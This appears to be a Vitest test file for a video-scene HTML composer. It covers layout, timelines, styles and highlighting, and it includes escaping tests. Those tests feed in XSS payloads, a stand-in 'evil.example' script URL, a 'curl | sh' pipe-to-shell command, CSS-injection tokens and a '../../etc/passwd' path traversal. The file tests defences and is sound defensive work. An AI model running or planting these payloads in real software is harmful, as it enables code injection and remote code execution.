import { runInNewContext } from "node:vm";
import { DETERMINISTIC_PROPS_EXAMPLES, type DeterministicKind, type Scene } from "@video-studio/schema";
import { layoutZones } from "@video-studio/platforms";
import { describe, expect, it } from "vitest";
import { buildComposition, compositionIdFor, fmtNumber, HYPERFRAMES_KINDS, kineticChunks, layerNodes, sanitizeFontChain } from "./hyperframes-compose.js";
import { codeLabel, highlightLines, languageFamily, tokenize } from "./hyperframes-highlight.js";
import { findStylesDir, getStyle } from "./styles.js";
import { resolveTokens } from "./tokens.js";
import type { RenderTarget, SceneRenderRequest, VisualTokens } from "./types.js";

const TOKENS: VisualTokens = {
  font_heading: "Inter, Helvetica, Arial, sans-serif",
  font_body: "Inter, Helvetica, Arial, sans-serif",
  font_mono: 'Menlo, "DejaVu Sans Mono", monospace',
  color_background: "#0B0F19",
  color_text: "#F5F7FA",
  color_primary: "#4F8CFF",
  color_secondary: "#22C55E",
};
const PORTRAIT: RenderTarget = { width: 1080, height: 1920, fps: 30, aspect_ratio: "9:16" };
const LANDSCAPE: RenderTarget = { width: 1920, height: 1080, fps: 30, aspect_ratio: "16:9" };
const KINDS = Object.keys(DETERMINISTIC_PROPS_EXAMPLES) as DeterministicKind[];

function req(kind: DeterministicKind, props: Record<string, unknown>, over: Partial<SceneRenderRequest> = {}, duration = 3): SceneRenderRequest {
  const scene: Scene = {
    id: "s01",
    duration_sec: duration,
    purpose: "point",
    voiceover: "",
    visual_strategy: "motion_graphic",
    deterministic: { kind, props },
    visual_requirements: { continuity_refs: [] },
    claim_refs: [],
  };
  return { scene, target: PORTRAIT, tokens: TOKENS, out_path: "/out/s01.mp4", project_dir: "/proj", ...over };
}

async function loadLint(): Promise<{ lintHyperframeHtml: (html: string) => Promise<{ errorCount: number; findings: Array<{ severity: string; code: string; message: string }> }> } | null> {
  try {
    const producer = import.meta.resolve("@hyperframes/producer");
    return await import(new URL("../../lint/dist/index.js", producer).href);
  } catch {
    return null;
  }
}

const XSS = `<script>alert(1)</script>"><img src=x onerror=alert(2)>`;

/** Props for every kind with the payload in every text field. */
const HOSTILE: Record<DeterministicKind, Record<string, unknown>> = {
  typography: { lines: [XSS, `a ${XSS}`], emphasis: XSS },
  code: { language: XSS, code: `const x = "${XSS}"; // ${XSS}\n${XSS}`, highlight_lines: [1] },
  diagram: { nodes: [XSS, "B"], edges: [[XSS, "B"]] },
  comparison: { left: { label: XSS, text: XSS }, right: { label: XSS, text: XSS }, verdict: XSS },
  cta: { headline: XSS, action: XSS, command: XSS, url: XSS },
  end_card: { title: XSS, subtitle: XSS },
  chart: { type: "bar", series: [{ label: XSS, value: 3 }, { label: "b", value: 5 }], unit: XSS, label: XSS },
  screenshot: { asset: XSS, callouts: [XSS, { text: XSS, x: 0.5, y: 0.5 }] },
  quote: { text: XSS, attribution: XSS, source: XSS },
  stat: { value: XSS, unit: XSS, label: XSS, context: XSS },
  timeline: { events: [{ label: XSS, text: XSS }, { label: "b" }], current: 0 },
  split_screen: { mode: "before_after", left: { label: XSS, text: XSS }, right: { label: XSS, text: XSS } },
  lower_third: { name: XSS, title: XSS, headline: XSS },
  kinetic_text: { text: `${XSS} words`, rhythm: "word", emphasis: XSS },
  map: { title: XSS, points: [{ label: XSS, x: 0.2, y: 0.3 }], route: false },
};

describe("buildComposition: snapshots of DETERMINISTIC_PROPS_EXAMPLES", () => {
  for (const kind of KINDS) {
    it(`${kind} (9:16)`, () => {
      const c = buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind]));
      expect(c.html).toMatchSnapshot();
      // Asset sources are absolute host paths; snapshot where they land in the composition.
      expect({ assets: c.assets.map((a) => a.dest), warnings: c.warnings }).toMatchSnapshot();
    });
  }
  it("chart variants and landscape layouts build", () => {
    for (const type of ["bar", "line", "pie"]) {
      const series = [{ label: "Q1", value: 10 }, { label: "Q2", value: 25.5 }, { label: "Q3", value: 1234 }];
      const c = buildComposition(req("chart", { type, series, unit: "ms", label: "latency" }, { target: LANDSCAPE }));
      expect(c.warnings).toEqual([]);
      expect(c.html).toContain("<svg");
    }
    const d = buildComposition(req("diagram", { nodes: ["A", "B", "C", "D"], edges: [["A", "B"], ["A", "C"], ["C", "D"]] }, { target: LANDSCAPE }));
    expect(d.html.match(/class="vs-node"/g)).toHaveLength(4);
    expect(d.html.match(/<polygon/g)).toHaveLength(3);
  });
});

describe("buildComposition: HyperFrames contract", () => {
  it("has root composition, one timed clip and a registered paused timeline", () => {
    for (const kind of KINDS) {
      const { html, composition_id } = buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind]));
      expect(composition_id).toBe("vs-s01");
      expect(html).toContain('data-composition-id="vs-s01" data-start="0" data-duration="3" data-width="1080" data-height="1920"');
      expect(html).toMatch(/<div id="vs-scene" class="clip [^"]*" data-start="0" data-duration="3" data-track-index="0">/);
      expect(html).toContain("window.__timelines = window.__timelines || {};");
      expect(html).toContain('window.__timelines["vs-s01"] = tl;');
      expect(html).toContain('<meta name="viewport" content="width=1080, height=1920">');
    }
  });

  it("composition id is derived safely from the scene id", () => {
    expect(compositionIdFor("s12")).toBe("vs-s12");
    expect(compositionIdFor('s1"];x')).toBe("vs-s1___x");
  });

  it("passes the HyperFrames 0.8.78 linter with zero errors for every kind", async () => {
    const lint = await loadLint();
    if (!lint) return; // lint package not resolvable in this install layout
    for (const kind of KINDS) {
      for (const target of [PORTRAIT, LANDSCAPE]) {
        const r = await lint.lintHyperframeHtml(buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind], { target })).html);
        const errors = r.findings.filter((f) => f.severity === "error");
        expect(errors, `${kind}: ${JSON.stringify(errors)}`).toEqual([]);
      }
    }
  });

  it("the registered timeline is a pure function of seek time", () => {
    const { html } = buildComposition(req("typography", { lines: ["Hello"] }));
    const script = /<script>([\s\S]*?)<\/script>/.exec(html)![1]!;
    const anims = [{ currentTime: -1, paused: false, pause() { this.paused = true; } }, { currentTime: -1, paused: false, pause() { this.paused = true; } }];
    const window: Record<string, any> = {};
    runInNewContext(script, { window, document: { getAnimations: () => anims } });
    const tl = window.__timelines["vs-s01"];
    expect(tl.duration()).toBe(3);
    expect(anims.every((a) => a.currentTime === 0 && a.paused)).toBe(true);
    tl.totalTime(1.25, true);
    expect(anims.map((a) => a.currentTime)).toEqual([1250, 1250]);
    expect(tl.time()).toBe(1.25);
    tl.seek(99);
    expect(anims[0]!.currentTime).toBe(3000);
    tl.play();
    expect(anims[0]!.currentTime).toBe(3000); // never self-advances
    expect(typeof tl.pause).toBe("function");
  });

  it("is deterministic and free of wall-clock, timer, random and network APIs", () => {
    for (const kind of KINDS) {
      const a = buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind]));
      const b = buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind]));
      expect(a).toEqual(b);
      for (const banned of ["Date.now", "new Date", "Math.random", "requestAnimationFrame", "setTimeout", "setInterval", "fetch(", "XMLHttpRequest", "performance.now"]) {
        expect(a.html, `${kind} uses ${banned}`).not.toContain(banned);
      }
    }
  });
});

/** Assets other than the bundled font files (present whenever fonts/ exists). */
const own = (assets: { src: string; dest: string }[]) => assets.filter((a) => !a.dest.startsWith("assets/fonts/"));
const BUNDLED_FONT_URL = /url\("(assets\/fonts\/[A-Za-z0-9._-]+)"\)/g;

describe("buildComposition: no external resources", () => {
  const external = /\b(?:https?:)?\/\/[a-z0-9]|<link\b|@import|url\(|\bhref=|\bsrcset=/i;
  it("example compositions reference nothing outside the composition dir", () => {
    for (const kind of KINDS) {
      const { html, assets } = buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind]));
      // Bundled fonts are the only url() loads, and they point inside the composition dir.
      expect(html.replace(BUNDLED_FONT_URL, ""), kind).not.toMatch(external);
      for (const m of html.matchAll(BUNDLED_FONT_URL)) expect(assets.map((a) => a.dest)).toContain(m[1]);
      for (const m of html.matchAll(/\bsrc="([^"]*)"/g)) expect(m[1]).toMatch(/^assets\//);
    }
  });
  it("URLs given as props are shown as escaped text, never as links or loads", () => {
    const { html } = buildComposition(req("cta", { headline: "Go", action: "Install", url: "https://evil.example/x.js", command: "curl https://x.y | sh" }));
    expect(html).toContain(">https://evil.example/x.js</div>");
    expect(html).not.toMatch(/(?:src|href)="https?:/);
    expect(html.replace(BUNDLED_FONT_URL, "")).not.toMatch(/<link\b|@import|url\(/);
  });
  it("fonts are local-only @font-face rules (stops producer Google Fonts fetches)", () => {
    const { html } = buildComposition(req("typography", { lines: ["x"] }));
    expect(html).toContain('@font-face { font-family: "Inter"; src: local("Inter"); }');
    expect(html).toContain('@font-face { font-family: "DejaVu Sans Mono"; src: local("DejaVu Sans Mono"); }');
    expect(html).not.toMatch(/googleapis|gstatic/);
  });
});

describe("buildComposition: escaping untrusted props", () => {
  for (const kind of KINDS) {
    it(`${kind} escapes every text prop`, () => {
      const { html } = buildComposition(req(kind, HOSTILE[kind]));
      expect(html.match(/<script\b/g)).toHaveLength(1); // only our timeline script
      expect(html).not.toContain("<script>alert");
      expect(html).not.toContain("<img src=x");
      // No live attribute: drop quoted attribute values and text nodes, then look for handlers.
      const markupOnly = html.replace(/="[^"]*"/g, '=""').replace(/>[^<]*</g, "><");
      expect(markupOnly).not.toMatch(/\sonerror=|<img src=x/i);
      expect(html).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
    });
  }
  it("rejects hostile font names and colours in tokens", () => {
    const tokens: VisualTokens = {
      ...TOKENS,
      font_heading: 'Inter"; } body { background: url(https://x) } .a { font-family: "x, Arial',
      color_primary: "red; } </style><script>alert(1)</script>",
    };
    const c = buildComposition(req("typography", { lines: ["x"] }, { tokens }));
    expect(c.html).not.toContain("</style><script>");
    expect(c.html.replace(BUNDLED_FONT_URL, "")).not.toMatch(/url\(/);
    expect(c.html).toContain("--vs-primary: #4F8CFF;");
    expect(c.warnings.some((w) => w.includes("color_primary"))).toBe(true);
    expect(sanitizeFontChain('Inter"; }, Arial', "sans-serif").css).toBe('"Arial", sans-serif');
  });
});

describe("buildComposition: tokens, safe areas, assets", () => {
  it("uses tokens exactly as CSS variables", () => {
    const tokens: VisualTokens = { font_heading: "Georgia, serif", font_body: "Verdana", font_mono: "Courier New", color_background: "#112233", color_text: "#FFEEDD", color_primary: "#ABCDEF", color_secondary: "#123456" };
    const { html } = buildComposition(req("cta", DETERMINISTIC_PROPS_EXAMPLES.cta, { tokens }));
    expect(html).toContain("--vs-bg: #112233;");
    expect(html).toContain("--vs-text: #FFEEDD;");
    expect(html).toContain("--vs-primary: #ABCDEF;");
    expect(html).toContain("--vs-secondary: #123456;");
    expect(html).toContain('--vs-font-heading: "Georgia", serif;');
    expect(html).toContain('--vs-font-body: "Verdana", sans-serif;');
    expect(html).toContain('--vs-font-mono: "Courier New", monospace;');
    expect(html).toContain("background: var(--vs-bg)");
  });

  it("keeps content inside the design-grid content zone without platform zones", () => {
    const { html } = buildComposition(req("typography", { lines: ["x"] }));
    expect(html).toContain(".vs-safe { position: absolute; left: 72px; top: 180px; width: 936px; height: 1060px;");
    const small = buildComposition(req("typography", { lines: ["x"] }, { target: { width: 180, height: 320, fps: 30, aspect_ratio: "9:16" } }));
    expect(small.html).toContain("top: 30px;");
    expect(small.html).toContain("height: 177px;");
  });

  it("lays content inside zones.content when zones are given", () => {
    const zones = { ...layoutZones({ width: 1080, height: 1920, aspect_ratio: "9:16" }), content: { x: 72, y: 180, w: 857, h: 1060 } };
    const { html, text_boxes } = buildComposition({ ...req("typography", { lines: ["Hello"] }), zones });
    expect(html).toContain(".vs-safe { position: absolute; left: 72px; top: 180px; width: 857px; height: 1060px;");
    for (const b of text_boxes) expect(b.rect.x + b.rect.w).toBeLessThanOrEqual(72 + 857);
  });

  it("reports text boxes with roles, sizes, truncation and colours", () => {
    const hook = buildComposition({ ...req("typography", { lines: ["Hello", "world"] }), scene: { ...req("typography", { lines: ["Hello", "world"] }).scene, purpose: "hook" } });
    expect(hook.text_boxes).toEqual([
      expect.objectContaining({ role: "hook", text: "Hello\nworld", truncated: false, color: "#F5F7FA", background: "#0B0F19" }),
    ]);
    const cta = buildComposition(req("cta", DETERMINISTIC_PROPS_EXAMPLES.cta));
    expect(cta.text_boxes.map((b) => b.role)).toContain("cta");
    for (const b of cta.text_boxes) {
      expect(b.font_px).toBeGreaterThan(0);
      expect(b.rect.y).toBeGreaterThanOrEqual(180);
    }
    const long = buildComposition(req("typography", { lines: [Array(300).fill("overflowing").join(" ")] }));
    expect(long.text_boxes[0]).toMatchObject({ role: "headline", truncated: true });
  });

  it("resolves screenshot assets inside the project only and copies them under assets/", () => {
    const ok = buildComposition(req("screenshot", { asset: "a1", callouts: ["Click", { text: "Here", x: 0.25, y: 40 }] }), { resolveAsset: (id) => (id === "a1" ? "source/assets/shot.png" : undefined) });
    expect(own(ok.assets)).toEqual([{ src: "/proj/source/assets/shot.png", dest: "assets/screenshot-1.png" }]);
    expect(ok.html).toContain('src="assets/screenshot-1.png"');
    expect(ok.html).toContain("left:25%;top:40%");
    expect(ok.warnings).toEqual([]);

    const escape = buildComposition(req("screenshot", { asset: "a1" }), { resolveAsset: () => "../../etc/passwd.png" });
    expect(own(escape.assets)).toEqual([]);
    expect(escape.warnings.join()).toMatch(/outside the project/);

    const byPath = buildComposition(req("screenshot", { asset: "shots/one.jpg" }));
    expect(own(byPath.assets)).toEqual([{ src: "/proj/shots/one.jpg", dest: "assets/screenshot-1.jpg" }]);

    const missing = buildComposition(req("screenshot", { asset: "a9" }));
    expect(own(missing.assets)).toEqual([]);
    expect(missing.html).toContain("vs-shot-missing");
  });

  it("adds the brand logo to cta and end_card", () => {
    const tokens = { ...TOKENS, logo_path: "brand/logo.svg" };
    const c = buildComposition(req("end_card", { title: "T" }, { tokens }));
    expect(own(c.assets)).toEqual([{ src: "/proj/brand/logo.svg", dest: "assets/logo-1.svg" }]);
    expect(c.html).toContain('<img src="assets/logo-1.svg"');
    expect(own(buildComposition(req("typography", { lines: ["x"] }, { tokens })).assets)).toEqual([]);
  });

  it("reports props it cannot honour", () => {
    expect(buildComposition(req("typography", { lines: ["abc"], emphasis: "zzz" })).warnings[0]).toMatch(/emphasis/);
    expect(buildComposition(req("diagram", { nodes: ["A"], edges: [["A", "Z"]] })).warnings[0]).toMatch(/unknown node/);
    const long = Array.from({ length: 200 }, (_, i) => `line ${i}`).join("\n");
    expect(buildComposition(req("code", { language: "ts", code: long })).warnings.join()).toMatch(/do not fit/);
  });

  it("rejects scenes without deterministic content", () => {
    const r = req("typography", { lines: ["x"] });
    delete r.scene.deterministic;
    expect(() => buildComposition(r)).toThrow(/no deterministic content/);
  });
});

describe("buildComposition: Phase 5 kinds", () => {
  const NEW_KINDS: DeterministicKind[] = ["quote", "stat", "timeline", "split_screen", "lower_third", "kinetic_text", "map"];
  const roles = (kind: DeterministicKind, props: Record<string, unknown>, over: Partial<SceneRenderRequest> = {}) =>
    buildComposition(req(kind, props, over)).text_boxes.map((b) => `${b.role}:${b.text}`);
  /** The markup after the stylesheet (which names every class). */
  const body = (html: string) => html.slice(html.indexOf("<body>"));

  it("are drawn natively (no typography fallback) and claimed by the renderer", () => {
    for (const kind of NEW_KINDS) {
      expect(HYPERFRAMES_KINDS).toContain(kind);
      for (const target of [PORTRAIT, LANDSCAPE]) {
        const c = buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind], { target }));
        expect(c.warnings, kind).toEqual([]);
        expect(body(c.html), kind).not.toContain("vs-typography");
        expect(c.html, `${kind}: duplicate class attribute`).not.toMatch(/<[^>]*\sclass="[^"]*"[^>]*\sclass="/);
        for (const b of c.text_boxes) {
          expect(b.truncated, `${kind}: ${b.text}`).toBe(false);
          expect(b.rect.x, `${kind}: ${b.text}`).toBeGreaterThanOrEqual(0);
          expect(b.rect.x + b.rect.w, `${kind}: ${b.text}`).toBeLessThanOrEqual(target.width);
          expect(b.rect.y + b.rect.h, `${kind}: ${b.text}`).toBeLessThanOrEqual(target.height);
        }
      }
    }
  });

  it("records text boxes with the right roles", () => {
    expect(roles("quote", DETERMINISTIC_PROPS_EXAMPLES.quote)).toEqual(["decorative:“", "headline:It just works.", "label:— A user", "label:README"]);
    expect(roles("stat", DETERMINISTIC_PROPS_EXAMPLES.stat)).toEqual(["headline:40%", "body:faster builds", "label:vs. last release"]);
    expect(roles("timeline", { events: [{ label: "A", text: "first" }, { label: "B" }] })).toEqual(["label:A", "body:first", "label:B"]);
    expect(roles("split_screen", DETERMINISTIC_PROPS_EXAMPLES.split_screen)).toEqual(["label:Before", "body:Manual edits", "label:After", "body:One command"]);
    expect(roles("lower_third", DETERMINISTIC_PROPS_EXAMPLES.lower_third)).toEqual(["label:Ada Lovelace", "label:Engineer", "headline:Why we built it"]);
    expect(roles("kinetic_text", DETERMINISTIC_PROPS_EXAMPLES.kinetic_text)).toEqual(["headline:Docs in. Video out."]);
    expect(roles("map", DETERMINISTIC_PROPS_EXAMPLES.map)).toEqual(["headline:Where it runs", "label:Laptop", "label:CI"]);
    const hook = req("quote", DETERMINISTIC_PROPS_EXAMPLES.quote);
    hook.scene.purpose = "hook";
    expect(buildComposition(hook).text_boxes.map((b) => b.role)).toContain("hook");
  });

  it("stat counts numeric values up with discrete frames and shows text values as is", () => {
    const n = buildComposition(req("stat", { value: 1234, label: "users" })).html;
    expect(n.match(/class="vs-count-frame/g)).toHaveLength(8);
    expect(n).toContain(">1,234</span>");
    const t = buildComposition(req("stat", { value: "10x", label: "faster" })).html;
    expect(body(t)).not.toContain("vs-count-frame");
    expect(t).toContain("<span>10x</span>");
  });

  it("timeline highlights the current event and warns when it is out of range", () => {
    const c = buildComposition(req("timeline", { events: [{ label: "A" }, { label: "B" }, { label: "C" }], current: 2 }));
    expect(c.html.match(/class="vs-tl-event vs-tl-current"/g)).toHaveLength(1);
    expect(c.html).toMatch(/class="vs-tl-event vs-tl-current"[^>]*><div[^>]*><div class="vs-tl-label"[^>]*>C</);
    expect(c.html.match(/vs-tl-dot vs-tl-past/g)).toHaveLength(2);
    expect(c.text_boxes.find((b) => b.text === "C")!.color).toBe(TOKENS.color_primary.toUpperCase());
    const none = buildComposition(req("timeline", { events: [{ label: "A" }, { label: "B" }], current: 5 }));
    expect(body(none.html)).not.toContain("vs-tl-current");
    expect(none.warnings.join()).toMatch(/current 5/);
  });

  it("timeline runs down the side in portrait and across in landscape", () => {
    const props = { events: [{ label: "A" }, { label: "B" }, { label: "C" }] };
    const p = buildComposition(req("timeline", props)).text_boxes;
    expect(new Set(p.map((b) => b.rect.x)).size).toBe(1);
    expect(p[0]!.rect.y).toBeLessThan(p[1]!.rect.y);
    expect(body(buildComposition(req("timeline", props)).html)).toContain("vs-grow-y");
    const l = buildComposition(req("timeline", props, { target: LANDSCAPE }));
    expect(new Set(l.text_boxes.map((b) => b.rect.y)).size).toBe(1);
    expect(l.text_boxes[0]!.rect.x).toBeLessThan(l.text_boxes[1]!.rect.x);
    expect(body(l.html)).toContain("vs-grow-x");
    expect(body(l.html)).not.toContain("vs-grow-y");
  });

  it("split_screen labels Before/After unless labels are given, and accents the after panel", () => {
    const ba = buildComposition(req("split_screen", { mode: "before_after", left: { text: "x" }, right: { label: "Now", text: "y" } }));
    expect(ba.text_boxes.filter((b) => b.role === "label").map((b) => b.text)).toEqual(["Before", "Now"]);
    expect(ba.html).toContain("vs-split vs-right vs-after");
    expect(ba.html).toContain("vs-split-arrow");
    const sbs = buildComposition(req("split_screen", { left: { text: "x" }, right: { text: "y" } }));
    expect(sbs.text_boxes.filter((b) => b.role === "label")).toEqual([]);
    expect(body(sbs.html)).not.toMatch(/vs-after|vs-before|vs-split-arrow/);
  });

  it("split_screen stacks in portrait, sits side by side in landscape, and loads panel images", () => {
    const props = { left: { label: "L", text: "x" }, right: { label: "R", text: "y" } };
    const [pl, , pr] = buildComposition(req("split_screen", props)).text_boxes;
    expect(pl!.rect.x).toBe(pr!.rect.x);
    expect(pl!.rect.y).toBeLessThan(pr!.rect.y);
    const [ll, , lr] = buildComposition(req("split_screen", props, { target: LANDSCAPE })).text_boxes;
    expect(ll!.rect.y).toBe(lr!.rect.y);
    expect(ll!.rect.x).toBeLessThan(lr!.rect.x);

    const img = buildComposition(req("split_screen", { left: { asset: "a1", text: "old" }, right: { asset: "a9" } }), { resolveAsset: (id) => (id === "a1" ? "source/a.png" : undefined) });
    expect(own(img.assets)).toEqual([{ src: "/proj/source/a.png", dest: "assets/split-left-1.png" }]);
    expect(img.html).toContain('<img src="assets/split-left-1.png"');
    expect(img.html).toContain("vs-shot-missing");
    expect(img.warnings.join()).toMatch(/right asset "a9"/);
  });

  it("lower_third keeps its bar low but inside the safe area", () => {
    const c = buildComposition(req("lower_third", DETERMINISTIC_PROPS_EXAMPLES.lower_third));
    const name = c.text_boxes.find((b) => b.text === "Ada Lovelace")!;
    const head = c.text_boxes.find((b) => b.role === "headline")!;
    expect(name.rect.y).toBeGreaterThan(180 + 1060 / 2);
    expect(name.rect.y + name.rect.h).toBeLessThanOrEqual(180 + 1060);
    expect(head.rect.y + head.rect.h).toBeLessThan(name.rect.y);
    expect(roles("lower_third", { name: "Solo" })).toEqual(["label:Solo"]);
  });

  it("kinetic_text reveals words or phrases in order, with the emphasis in primary", () => {
    expect(kineticChunks("Docs in. Video out.", "word").map((c) => c.text)).toEqual(["Docs", "in.", "Video", "out."]);
    expect(kineticChunks("Docs in, video out. Done!", "phrase").map((c) => c.text)).toEqual(["Docs in,", "video out.", "Done!"]);
    expect(kineticChunks("no punctuation here", "phrase").map((c) => c.text)).toEqual(["no punctuation here"]);
    const word = buildComposition(req("kinetic_text", { text: "Docs in. Video out.", emphasis: "video out" })).html;
    expect(word.match(/class="vs-kin-chunk /g)).toHaveLength(4);
    expect(word).toContain('<span class="vs-em">Video</span>');
    expect(word).toContain('<span class="vs-em">out</span>.');
    const times = [...word.matchAll(/vs-kin" style="--t:([\d.]+)s/g)].map((m) => Number(m[1]));
    expect(times).toEqual([...times].sort((a, b) => a - b));
    expect(new Set(times).size).toBe(4);
    const phrase = buildComposition(req("kinetic_text", { text: "Docs in. Video out.", rhythm: "phrase" })).html;
    expect(phrase.match(/class="vs-kin-chunk /g)).toHaveLength(2);
    expect(phrase).toContain('data-rhythm="phrase"');
    expect(buildComposition(req("kinetic_text", { text: "abc", emphasis: "zzz" })).warnings.join()).toMatch(/emphasis/);
  });

  it("map pins points on an abstract panel and draws the route as a polyline in order", () => {
    const points = [{ label: "A", x: 0, y: 0 }, { label: "B", x: 1, y: 0.5 }, { label: "C", x: 0.5, y: 1 }];
    const c = buildComposition(req("map", { points, route: true }));
    expect(c.html.match(/<polyline/g)).toHaveLength(1);
    const pts = /<polyline points="([^"]+)"/.exec(c.html)![1]!.split(" ").map((p) => p.split(",").map(Number));
    expect(pts).toHaveLength(3);
    expect(pts[0]![0]).toBeLessThan(pts[1]![0]!); // A (left) then B (right)
    expect(pts[2]![1]).toBeGreaterThan(pts[1]![1]!); // then C (bottom)
    expect(body(c.html).match(/vs-map-pin/g)).toHaveLength(3);
    expect(c.html).toContain("vs-map-slot vs-map-left"); // B at the right edge labels to its left
    expect(c.html).not.toMatch(/<image|<img/);
    expect(buildComposition(req("map", { points, route: false })).html).not.toContain("<polyline");
    const one = buildComposition(req("map", { points: [points[0]], route: true }));
    expect(one.html).not.toContain("<polyline");
    expect(one.warnings.join()).toMatch(/route needs at least 2/);
  });
});

describe("helpers", () => {
  it("layers nodes by longest path and survives cycles", () => {
    expect(layerNodes(4, [[0, 1], [1, 2], [0, 2], [2, 3]])).toEqual([0, 1, 2, 3]);
    expect(layerNodes(3, [[0, 1], [1, 0]]).every((l) => l >= 0 && l < 3)).toBe(true);
    expect(layerNodes(3, [])).toEqual([0, 0, 0]);
  });
  it("formats numbers without locale", () => {
    expect(fmtNumber(1234567.891)).toBe("1,234,567.89");
    expect(fmtNumber(-40)).toBe("-40");
    expect(fmtNumber(0.5)).toBe("0.5");
  });
});

describe("syntax highlighting", () => {
  it("round-trips the source exactly", () => {
    const src = 'import { x } from "y";\n// note\nconst n = 42 * f(x);\n';
    expect(tokenize(src, "ts").map((t) => t.text).join("")).toBe(src);
  });
  it("classifies common tokens", () => {
    const toks = tokenize('const s = "hi"; // c\nreturn f(1);', "typescript");
    const cls = (text: string) => toks.find((t) => t.text === text)?.cls;
    expect(cls("const")).toBe("kw");
    expect(cls('"hi"')).toBe("str");
    expect(cls("// c")).toBe("com");
    expect(cls("f")).toBe("fn");
    expect(cls("1")).toBe("num");
    expect(tokenize("npm install x # go", "bash").find((t) => t.cls === "fn")?.text).toBe("npm");
    expect(tokenize("def f():\n  return None", "python").filter((t) => t.cls === "kw").map((t) => t.text)).toEqual(["def", "return"]);
    expect(tokenize('{"a": 1}', "json")[1]).toEqual({ text: '"a"', cls: "key" });
    expect(tokenize("SELECT * FROM t", "sql").filter((t) => t.cls === "kw")).toHaveLength(2);
    expect(languageFamily("Rust")).toBe("c");
    expect(languageFamily("brainfuck")).toBe("plain");
  });
  it("labels code panels only with a real language", () => {
    for (const tag of [undefined, "", "text", "TXT", " plaintext "]) expect(codeLabel(tag)).toBeUndefined();
    expect(codeLabel("bash")).toBe("bash");
    expect(buildComposition(req("code", { code: "npm i x", language: "text" })).html).not.toContain("<em>");
    expect(buildComposition(req("code", { code: "npm i x", language: "bash" })).html).toContain("<em>bash</em>");
  });
  it("escapes code and splits lines", () => {
    const lines = highlightLines('a < b && "<x>"\n/* multi\nline */', "js");
    expect(lines).toHaveLength(3);
    expect(lines[0]).toContain("a &lt; b &amp;&amp;");
    expect(lines[0]).toContain('<span class="tk-str">&quot;&lt;x&gt;&quot;</span>');
    expect(lines[1]).toBe('<span class="tk-com">/* multi</span>');
    expect(lines[2]).toBe('<span class="tk-com">line */</span>');
  });
});

describe("buildComposition: style tokens", () => {
  const stylesDir = findStylesDir({});
  const styled = async (id: string): Promise<VisualTokens> => ({ ...resolveTokens(undefined, {}, await getStyle(stylesDir, id)), font_mono: TOKENS.font_mono });
  const fontSizes = (html: string) => [...html.matchAll(/font-size:([\d.]+)px/g)].map((m) => Number(m[1]));

  it("heading and body weights, easing, entrance length and stagger reach the CSS and timeline", async () => {
    const t = await styled("energetic");
    const { html } = buildComposition(req("typography", { lines: ["one", "two", "three"] }, { tokens: t }));
    expect(html).toContain("/* style pack */");
    expect(html).toMatch(/\.vs-typography, [^{]*\.vs-headline[^{]*\{ font-weight: 800; \}/);
    expect(html).toContain("#vs-root { font-weight: 500; }");
    expect(html).toContain("animation-timing-function: cubic-bezier(0.34, 1.56, 0.64, 1)");
    const starts = [...html.matchAll(/vs-fade-up" style="--t:([\d.]+)s;--d:([\d.]+)s/g)].map((m) => [Number(m[1]), Number(m[2])]);
    expect(starts).toHaveLength(3);
    expect(starts.map(([, d]) => d)).toEqual([0.35, 0.35, 0.35]);
    expect(Math.round((starts[1]![0]! - starts[0]![0]!) * 1000)).toBe(70);
    expect(html).toContain(">ONE</span>");
  });

  it("exits: the safe area fades out over exit_ms ending on the last frame, only for cut transitions", async () => {
    const en = await styled("energetic");
    const cut = { ...en, motion: { ...en.motion!, transition: "cut" as const } };
    const e = buildComposition(req("typography", { lines: ["x"] }, { tokens: cut }));
    expect(e.html).toContain('<div class="vs-safe vs-exit" style="--xt:2.847s;--xd:0.12s">');
    expect(e.html).toContain("@keyframes vs-exit");
    // Energetic whips into the next scene during assembly, so the scene does not fade itself out.
    expect(buildComposition(req("typography", { lines: ["x"] }, { tokens: en })).html).toContain('<div class="vs-safe">');
    const tech = buildComposition(req("typography", { lines: ["x"] }, { tokens: await styled("technical") }));
    expect(tech.html).toContain('<div class="vs-safe">');
    expect(tech.html).not.toContain("vs-exit");
    expect(tech.html).toContain("animation-timing-function: cubic-bezier(0.2, 0.9, 0.1, 1)");
  });

  it("text case, left alignment and heading scale; text boxes carry the final text and size", async () => {
    const ed = await styled("editorial");
    const c = buildComposition(req("cta", { headline: "the case for vectors", action: "Read more" }, { tokens: ed }));
    expect(c.html).toContain(">The Case for Vectors</div>");
    expect(c.html).toContain(".vs-cta, .vs-end { align-items: flex-start; }");
    expect(c.text_boxes.find((b) => b.role === "cta" && b.text === "The Case for Vectors")).toBeDefined();
    const base = buildComposition(req("end_card", { title: "Hi" }));
    const big = buildComposition(req("end_card", { title: "Hi" }, { tokens: await styled("energetic") }));
    const small = buildComposition(req("end_card", { title: "Hi" }, { tokens: await styled("minimal") }));
    const [b0, b1, b2] = [base, big, small].map((x) => x.text_boxes.find((b) => b.role === "headline")!);
    expect(b1!.font_px).toBeCloseTo(b0!.font_px * 1.12, 0);
    expect(b2!.font_px).toBeLessThan(b0!.font_px);
    expect(fontSizes(big.html)).toContain(b1!.font_px);
    expect(big.html).toContain(">HI</div>");
    expect(small.html).toContain(".vs-quote { text-align: center; }");
  });

  it("a style-less build after a styled one is unchanged (motion state is reset)", async () => {
    const before = buildComposition(req("quote", DETERMINISTIC_PROPS_EXAMPLES.quote)).html;
    buildComposition(req("quote", DETERMINISTIC_PROPS_EXAMPLES.quote, { tokens: await styled("energetic") }));
    expect(buildComposition(req("quote", DETERMINISTIC_PROPS_EXAMPLES.quote)).html).toBe(before);
    expect(before).not.toContain("style pack");
  });

  it("passes the HyperFrames linter with zero errors for every kind in every core style", async () => {
    const lint = await loadLint();
    if (!lint) return;
    for (const id of ["minimal", "editorial", "technical", "energetic"]) {
      const t = await styled(id);
      for (const kind of KINDS) {
        const r = await lint.lintHyperframeHtml(buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind], { tokens: t })).html);
        const errors = r.findings.filter((f) => f.severity === "error");
        expect(errors, `${id}/${kind}: ${JSON.stringify(errors)}`).toEqual([]);
      }
    }
  });

